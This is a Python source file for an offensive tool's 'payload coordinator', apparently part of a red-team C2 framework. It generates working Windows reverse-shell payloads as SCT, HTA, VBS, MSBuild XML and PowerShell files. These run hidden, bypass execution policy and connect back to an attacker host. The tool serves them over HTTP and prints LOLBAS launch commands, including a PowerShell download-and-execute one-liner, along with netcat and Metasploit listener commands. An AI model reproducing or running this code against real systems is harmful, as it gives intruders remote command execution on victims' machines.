#!/usr/bin/env python3
"""
Payload Coordinator Module
Seamlessly coordinates target system, payload generation, and reverse shell setup
"""

import os
import socket
import subprocess
import threading
import time
import http.server
import socketserver
from pathlib import Path
from typing import Dict, Tuple, Optional


class PayloadCoordinator:
    """
    Coordinates payload generation, HTTP server, and listener management
    """
    
    def __init__(self, lolbas_dir='lolbas_templates'):
        self.lolbas_dir = Path(lolbas_dir)
        self.http_server = None
        self.http_server_thread = None
        self.listener_process = None
        self.current_lhost = None
        self.current_lport = None
        self.current_http_port = None
        # Ensure top-level lolbas directory exists and deduplicate nested copies
        try:
            self.lolbas_dir.mkdir(exist_ok=True)
            self._deduplicate_lolbas_dirs()
        except Exception:
            pass
    
    def get_local_ip(self) -> str:
        """Get the local IP address"""
        try:
            # Create a socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def detect_target_os(self, target_ip: str) -> Tuple[str, str]:
        """
        Detect target OS using TTL analysis
        
        Returns:
            Tuple of (os_type, confidence)
        """
        try:
            # Ping the target and check TTL
            import platform
            system = platform.system().lower()
            
            if system == 'windows':
                ping_cmd = ['ping', '-n', '1', target_ip]
            else:
                ping_cmd = ['ping', '-c', '1', target_ip]
            
            result = subprocess.run(ping_cmd, capture_output=True, text=True, timeout=3)
            output = result.stdout
            
            # Extract TTL
            if 'ttl=' in output.lower():
                ttl_str = output.lower().split('ttl=')[1].split()[0]
                ttl = int(ttl_str)
                
                # TTL analysis
                if ttl <= 64:
                    return ('Linux/Unix', 'High')
                elif ttl <= 128:
                    return ('Windows', 'High')
                elif ttl <= 255:
                    return ('Network Device', 'Medium')
            
            return ('Unknown', 'Low')
        except:
            return ('Unknown', 'Low')
    
    def suggest_payload(self, target_os: str, use_lolbas: bool = False) -> Tuple[str, str]:
        """
        Suggest appropriate payload category and subcategory
        
        Args:
            target_os: Target operating system
            use_lolbas: Whether to use LOLBAS techniques
        
        Returns:
            Tuple of (category, subcategory)
        """
        target_lower = target_os.lower()
        
        if 'windows' in target_lower:
            if use_lolbas:
                return ('LOLBAS (Windows)', 'Rundll32')
            else:
                return ('PowerShell', 'Advanced')
        elif 'linux' in target_lower or 'unix' in target_lower:
            return ('Bash', 'Advanced')
        else:
            return ('PowerShell', 'Simple')
    
    def generate_lolbas_templates(self, lhost: str, lport: int, http_port: int = 8080):
        """
        Generate LOLBAS template files with correct LHOST/LPORT
        
        Args:
            lhost: Local host IP (attacker)
            lport: Local port for reverse shell
            http_port: Port for HTTP server
        """
        # Ensure directory exists
        self.lolbas_dir.mkdir(exist_ok=True)
        
        # Generate SCT file (for RegSvr32)
        sct_content = f'''<?XML version="1.0"?>
<!-- SCT File for RegSvr32 LOLBAS Attack -->
<!-- Usage: regsvr32.exe /s /n /u /i:http://{lhost}:{http_port}/payload.sct scrobj.dll -->
<scriptlet>

<registration
    description="Red Team Payload"
    progid="RedTeam.Payload"
    version="1.00"
    classid="{{A1112221-0000-0000-0000-000000000001}}"
    >
</registration>

<script language="JScript">
<![CDATA[

// PowerShell reverse shell payload
var command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " +
    "\\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});" +
    "$stream = $client.GetStream();" +
    "[byte[]]$bytes = 0..65535|%{{0}};" +
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{" +
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
    "$sendback = (iex $data 2>&1 | Out-String );" +
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
    "$stream.Write($sendbyte,0,$sendbyte.Length);" +
    "$stream.Flush()}};" +
    "$client.Close()\\"";

// Create WScript.Shell object and execute
var shell = new ActiveXObject("WScript.Shell");
shell.Run(command, 0, false);

]]>
</script>

</scriptlet>'''
        
        # Generate HTA file (for MSHTA)
        hta_content = f'''<html>
<head>
<title>Red Team Payload</title>
<HTA:APPLICATION ID="RedTeam" 
    APPLICATIONNAME="RedTeam"
    BORDER="none"
    CAPTION="no"
    SHOW="hide"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    SYSMENU="no"
    WINDOWSTATE="minimize" />

<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " & _
        "\\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});" & _
        "$stream = $client.GetStream();" & _
        "[byte[]]$bytes = 0..65535|%{{0}};" & _
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{" & _
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" & _
        "$sendback = (iex $data 2>&1 | Out-String );" & _
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" & _
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
        "$stream.Write($sendbyte,0,$sendbyte.Length);" & _
        "$stream.Flush()}};" & _
        "$client.Close()\\""
    
    objShell.Run command, 0, False
    window.close()
</script>
</head>
<body>
</body>
</html>'''
        
        # Generate VBS file (for WScript/CScript)
        vbs_content = f'''Set objShell = CreateObject("WScript.Shell")
command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " & _
    "\\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});" & _
    "$stream = $client.GetStream();" & _
    "[byte[]]$bytes = 0..65535|%%{{0}};" & _
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{" & _
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" & _
    "$sendback = (iex $data 2>&1 | Out-String );" & _
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" & _
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
    "$stream.Write($sendbyte,0,$sendbyte.Length);" & _
    "$stream.Flush()}};" & _
    "$client.Close()\\""

objShell.Run command, 0, False'''
        
        # Generate XML file (for MSBuild)
        xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RedTeam">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Text;
        using System.IO;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task, ITask
        {{
          public override bool Execute()
          {{
            try
            {{
              TcpClient client = new TcpClient("{lhost}", {lport});
              NetworkStream stream = client.GetStream();
              StreamReader reader = new StreamReader(stream);
              StreamWriter writer = new StreamWriter(stream);
              
              while(true)
              {{
                writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                writer.Flush();
                
                string cmd = reader.ReadLine();
                if(cmd == "exit") break;
                
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + cmd;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.Start();
                
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                writer.Write(output + error);
                writer.Flush();
              }}
              
              client.Close();
            }}
            catch{{ }}
            
            return true;
          }}
        }}
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>'''
        
        # Generate PowerShell payload
        ps1_content = f'''# C2PY PowerShell Agent
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    
    try {{
        $sendback = (iex $data 2>&1 | Out-String )
    }} catch {{
        $sendback = $_.Exception.Message
    }}
    
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}

$client.Close()'''
        
        # Write all files
        (self.lolbas_dir / 'payload.sct').write_text(sct_content)
        (self.lolbas_dir / 'payload.hta').write_text(hta_content)
        (self.lolbas_dir / 'payload.vbs').write_text(vbs_content)
        (self.lolbas_dir / 'payload.xml').write_text(xml_content)
        (self.lolbas_dir / 'payload.ps1').write_text(ps1_content)
        
        return {
            'sct': str(self.lolbas_dir / 'payload.sct'),
            'hta': str(self.lolbas_dir / 'payload.hta'),
            'vbs': str(self.lolbas_dir / 'payload.vbs'),
            'xml': str(self.lolbas_dir / 'payload.xml'),
            'ps1': str(self.lolbas_dir / 'payload.ps1'),
        }

    def _deduplicate_lolbas_dirs(self):
        """
        Find nested `lolbas_templates` directories and consolidate files into the top-level
        `self.lolbas_dir`. This fixes accidental recursive copies where templates were
        created inside nested folders of the same name.
        """
        try:
            root = self.lolbas_dir.resolve()
        except Exception:
            return

        # Walk tree and find directories named like the root (but not the root itself)
        for dirpath, dirnames, filenames in os.walk(root):
            # Skip the root directory itself
            cur = Path(dirpath).resolve()
            if cur == root:
                continue

            if cur.name == root.name:
                # Move all files up to root
                for f in filenames:
                    src = cur / f
                    dest = root / f
                    try:
                        if dest.exists():
                            # If files differ, create a unique name to avoid overwrite
                            if src.read_bytes() != dest.read_bytes():
                                dest = root / (f + '.dup')
                                src.replace(dest)
                            else:
                                # identical file, remove duplicate
                                src.unlink()
                        else:
                            src.replace(dest)
                    except Exception:
                        # fallback to copy if replace fails
                        try:
                            data = src.read_bytes()
                            dest.write_bytes(data)
                            src.unlink()
                        except Exception:
                            continue

                # Attempt to remove the now-empty nested directory (and parents if they are nested copies)
                try:
                    # remove empty dirs upwards until we hit root or a non-empty dir
                    p = cur
                    while p != root and p.exists():
                        try:
                            p.rmdir()
                        except OSError:
                            break
                        p = p.parent
                except Exception:
                    pass
    
    def start_http_server(self, port: int = 8080) -> bool:
        """
        Start HTTP server in a separate thread
        
        Args:
            port: Port to listen on
        
        Returns:
            True if server started successfully
        """
        if self.http_server_thread and self.http_server_thread.is_alive():
            print(f"[!] HTTP server already running on port {self.current_http_port}")
            return False

        # Create a server class that allows address reuse
        class _ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True

        # Use handler that serves from the lolbas_dir without changing CWD
        try:
            from functools import partial
            handler = partial(http.server.SimpleHTTPRequestHandler, directory=str(self.lolbas_dir))
        except Exception:
            handler = http.server.SimpleHTTPRequestHandler

        # Try to bind to requested port; on EADDRINUSE try next ports up to +10
        max_tries = 10
        attempt = 0
        bound = False
        last_exc = None

        while attempt < max_tries and not bound:
            try_port = port + attempt
            try:
                self.http_server = _ReusableTCPServer(("0.0.0.0", try_port), handler)
                self.current_http_port = try_port
                bound = True
            except OSError as e:
                last_exc = e
                # Address already in use: try next port
                if getattr(e, 'errno', None) in (98,):
                    attempt += 1
                    continue
                else:
                    print(f"[!] Failed to start HTTP server on {try_port}: {e}")
                    return False

        if not bound:
            print(f"[!] Failed to bind HTTP server after {max_tries} attempts: {last_exc}")
            return False

        try:
            # Start in thread
            self.http_server_thread = threading.Thread(
                target=self.http_server.serve_forever,
                daemon=True
            )
            self.http_server_thread.start()

            print(f"[+] HTTP server started on port {self.current_http_port}")
            print(f"[+] Serving files from: {self.lolbas_dir.absolute()}")
            return True
        except Exception as e:
            print(f"[!] Failed to start HTTP server: {e}")
            return False
    
    def stop_http_server(self):
        """Stop the HTTP server"""
        if self.http_server:
            self.http_server.shutdown()
            self.http_server = None
            self.http_server_thread = None
            print("[+] HTTP server stopped")
    
    def generate_complete_attack(self, target_ip: str, target_os: str = None, 
                                lhost: str = None, lport: int = 4444, 
                                http_port: int = 8080, use_lolbas: bool = True) -> Dict:
        """
        Generate complete attack with all components
        
        Args:
            target_ip: Target IP address
            target_os: Target OS (auto-detect if None)
            lhost: Local host IP (auto-detect if None)
            lport: Listener port
            http_port: HTTP server port
            use_lolbas: Use LOLBAS techniques
        
        Returns:
            Dictionary with all attack components
        """
        # Auto-detect if needed
        if not lhost:
            lhost = self.get_local_ip()
        
        if not target_os:
            target_os, confidence = self.detect_target_os(target_ip)
            print(f"[*] Detected OS: {target_os} (Confidence: {confidence})")
        
        # Store current config
        self.current_lhost = lhost
        self.current_lport = lport
        
        # Generate LOLBAS templates
        if use_lolbas and 'windows' in target_os.lower():
            print("[*] Generating LOLBAS templates...")
            templates = self.generate_lolbas_templates(lhost, lport, http_port)
        else:
            templates = {}
        
        # Suggest payload
        category, subcategory = self.suggest_payload(target_os, use_lolbas)
        
        # Generate listener commands
        listener_commands = {
            'netcat': f'nc -lvnp {lport}',
            'ncat': f'ncat -lvnp {lport} --ssl',
            'socat': f'socat TCP-LISTEN:{lport},reuseaddr,fork -',
            'metasploit': f'msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"',
        }
        
        # Build attack info
        attack = {
            'target_ip': target_ip,
            'target_os': target_os,
            'lhost': lhost,
            'lport': lport,
            'http_port': http_port,
            'suggested_category': category,
            'suggested_subcategory': subcategory,
            'templates': templates,
            'listener_commands': listener_commands,
            'http_server_url': f'http://{lhost}:{http_port}/',
        }
        
        # Add LOLBAS commands if applicable
        if templates:
            attack['lolbas_commands'] = {
                'regsvr32': f'regsvr32.exe /s /n /u /i:http://{lhost}:{http_port}/payload.sct scrobj.dll',
                'mshta': f'mshta.exe http://{lhost}:{http_port}/payload.hta',
                'wscript': f'wscript.exe http://{lhost}:{http_port}/payload.vbs',
                'msbuild': f'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe http://{lhost}:{http_port}/payload.xml',
                'powershell': f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://{lhost}:{http_port}/payload.ps1\')"',
            }
        
        return attack


if __name__ == "__main__":
    # Test the coordinator
    coordinator = PayloadCoordinator()
    
    print("="*60)
    print("Payload Coordinator Test")
    print("="*60)
    
    # Get local IP
    lhost = coordinator.get_local_ip()
    print(f"\n[*] Local IP: {lhost}")
    
    # Generate complete attack
    print("\n[*] Generating complete attack...")
    attack = coordinator.generate_complete_attack(
        target_ip="192.168.1.100",
        lport=4444,
        http_port=8080
    )
    
    print(f"\n[+] Target: {attack['target_ip']}")
    print(f"[+] OS: {attack['target_os']}")
    print(f"[+] Suggested Payload: {attack['suggested_category']} > {attack['suggested_subcategory']}")
    print(f"[+] LHOST: {attack['lhost']}")
    print(f"[+] LPORT: {attack['lport']}")
    
    if 'lolbas_commands' in attack:
        print("\n[*] LOLBAS Commands:")
        for name, cmd in attack['lolbas_commands'].items():
            print(f"\n  {name}:")
            print(f"    {cmd}")
    
    print("\n[*] Listener Command:")
    print(f"    {attack['listener_commands']['netcat']}")
